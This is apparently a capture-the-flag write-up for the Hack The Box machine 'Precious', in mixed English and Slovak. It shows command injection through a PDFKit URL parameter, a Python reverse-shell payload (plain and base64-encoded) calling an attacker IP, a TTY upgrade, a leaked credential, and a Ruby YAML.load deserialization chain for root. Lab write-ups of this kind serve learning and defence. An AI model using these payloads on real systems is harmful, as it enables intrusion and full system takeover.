---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Precious

1. update hosts
2. Site accepts post with url=http://\* ()
3. post with url=http://# returns PDF and some details with the SW it uses

Asi tato chyba https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

## NMAP

sudo nmap -sV 10.10.11.189 ... PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open  http    nginx 1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ...

## RCE

Following command works

1. `http://10.10.14.51:8000/result=$(whoami)`
2. space `http://10.10.14.46:1234/?result=$(cat$IFS/etc/passwd)`
3. `$(echo$IFS"Ahoj")`
4. `` http://10.10.14.53:4444/?result='%20`echo whatever | base64`' ``

The `$IFS` is delimiter in bash

#### Exploit

otvorit webserver, nahradit za svoju adresu

1. Open listener: sudo python3 -m http.server 4444
2. Execute commm

Payload is:

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.51",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

The whole command is:

```
http://10.10.14.53:4444/?result='%20`echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjUzIiw0NDQ1KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTs= | base64 -d | python3`'
```

## TTY shell

https://Netsec.ws/?p=337 or `python3 -c 'import pty;pty.spawn("/bin/bash")'`, then do ctrl+z, type `stty raw -echo` in host terminal and `fg` to enable tab autocomplete.

# User

Henry **cat /home/ruby/.bundle/config** BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

# Root

`sudo -l`

Vulnerable yaml parsing (Ruby YAML.load). See: https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

the command that will be execued is in `git_set`

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```